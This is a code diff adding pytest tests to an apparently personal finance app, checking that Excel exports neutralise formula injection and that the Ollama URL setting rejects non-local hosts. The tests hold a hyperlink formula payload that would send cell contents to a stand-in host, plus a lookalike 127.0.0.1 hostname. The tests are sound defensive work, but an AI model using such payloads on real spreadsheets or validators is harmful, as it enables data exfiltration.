@@ -119,3 +119,25 @@ def test_confirm_and_make_rule(client):
 def test_write_without_header_rejected(client):
     r = client.post("/api/rules/rerun", headers={"X-FinTrack": ""})
     assert r.status_code == 403
+
+
+def test_excel_formula_injection_neutralised(client):
+    import openpyxl
+
+    from .conftest import KOTAK_CSV
+
+    evil = KOTAK_CSV.replace("UPI/SWIGGY/509312345678/food", '=HYPERLINK("http://x.example/?"&A1)')
+    client.post("/api/imports", files={"file": ("e.csv", io.BytesIO(evil.encode()))}, data={"account_id": 1})
+    r = client.post(f"/api/reports/{FY}/excel")
+    wb = openpyxl.load_workbook(io.BytesIO(r.content))
+    ws = wb["All transactions"]
+    vals = [c.value for row in ws.iter_rows() for c in row if isinstance(c.value, str) and "HYPERLINK" in c.value]
+    assert vals and all(v.startswith("'=") for v in vals)
+    assert all(c.data_type != "f" for row in ws.iter_rows() for c in row)
+
+
+def test_ollama_url_must_be_local(client):
+    bad = client.put("/api/settings/ollama", json={"url": "http://127.0.0.1.evil.example:11434"})
+    assert bad.status_code == 400
+    ok = client.put("/api/settings/ollama", json={"url": "http://127.0.0.1:11434"})
+    assert ok.status_code == 200
